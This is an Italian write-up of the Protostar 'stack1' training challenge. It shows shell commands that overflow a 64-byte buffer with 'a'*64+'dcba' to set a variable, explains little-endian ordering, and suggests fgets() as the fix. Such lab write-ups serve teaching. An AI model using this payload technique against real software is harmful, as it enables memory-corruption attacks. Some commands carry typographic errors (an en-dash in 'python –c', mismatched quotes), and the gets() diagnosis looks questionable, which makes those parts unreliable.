# Protostar_stack 1 - Buffer overflow

## Obiettivo della sfida
Impostare la variabile _modified_ al valore **0x61626364** a tempo di esecuzione

## Strategia di attacco
Mandiamo in escuzione il **stack1**
```bash
> cd /opt/protostar/bin
> ./stack1 abc
# stampa errore
Try again, you got 0x00000000
```
### Cosa fare
Riempire _buffer_ con 64 caratteri e alla fine appendere i 4 corrispondenti a 0x61626364 essi corrispondono alla stringa **"abcd"**

## Come sfruttare le vulnerabilità
Proviamo ad eseguire
```bash
> /opt/protostar/bin/stack1 'python –c 'print "a" * 64 + "abcd"'' 
# stampa errore
Try again, you got 0x64636261
```
Anche se l'input è stato inserito correttamente appare a rovescio, questo avviene perchè l'architettura Intel è **Little Endian**!
### Istruzioni da eseguire
```bash
> /opt/protostar/bin/stack1 $(python –c 'print "a" * 64 + "dcba"')
# sfida vinta
```
## Debolezze
1. `gets()` non effettua controlli sul buffer overflow

## Mitigazione
1. sostituire la funzione`gets()` con `fgets()`
